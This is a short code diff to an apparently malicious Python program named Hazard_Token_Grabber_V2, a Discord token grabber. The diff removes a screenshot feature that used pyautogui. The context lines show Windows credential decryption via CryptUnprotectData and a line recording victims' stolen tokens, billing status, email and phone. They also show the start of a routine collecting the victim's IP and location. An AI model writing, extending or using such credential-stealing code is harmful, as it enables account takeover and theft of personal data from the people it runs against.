@@ -6,7 +6,6 @@ import zipfile
 import json 
 import base64 
 import psutil 
-import pyautogui
 
 from win32crypt import CryptUnprotectData
 from re import findall
@@ -259,10 +258,6 @@ class Hazard_Token_Grabber_V2:
                 
                 f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
         f.close()
-
-    def screenshot(self):
-        image = pyautogui.screenshot()
-        image.save(self.tempfolder + "\\Screenshot.png")
 
     def SendInfo(self):
         ip = country = city = region = googlemap = "None"
